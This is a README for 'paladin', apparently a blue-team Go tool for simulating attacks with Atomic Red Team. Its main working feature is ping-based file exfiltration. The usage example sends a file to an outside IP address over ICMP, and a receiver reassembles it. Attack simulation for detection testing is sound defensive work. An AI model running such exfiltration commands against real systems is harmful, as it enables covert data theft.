<p align="center"> 
  <img src="images/logo.png" width="250" title="paladin" align="center">
  <p align="center">A blueteam tool to simulate attacks using Atomic Red Team and other techniques.</p>
</p>

---

## Getting started

### Ping Exfil

The ping exfil subcommand is working and implements a basic ping exfil attack scenario.
```
Run ping exfil like tests on current host

Usage:
  paladin exfil ping [flags]
  paladin exfil ping [command]

Available Commands:
  receive     Packet capture ping requests and reassemble files

Flags:
  -d, --destination string   The Destination Host of the Ping
  -f, --file string          The name of the file to send over ping
  -h, --help                 help for ping

Use "paladin exfil ping [command] --help" for more information about a command.
```
#### Basic Usage
Client

```console
$ paladin exfil ping -d 45.63.67.242 -f test.txt
```

Server
```console
$ paladin exfil ping receive -i ens3
```
### Atomic Red Team


### DNS Exfil
WIP

### Infection Gopher
WIP

## Local Development

This project requires Go to be installed. On OS X with Homebrew you can just run `brew install go`.

Building locally requires statik 

```console
$ go get github.com/rakyll/statik
```

Running it then should be as simple as:

```console
$ make
$ ./bin/paladin
```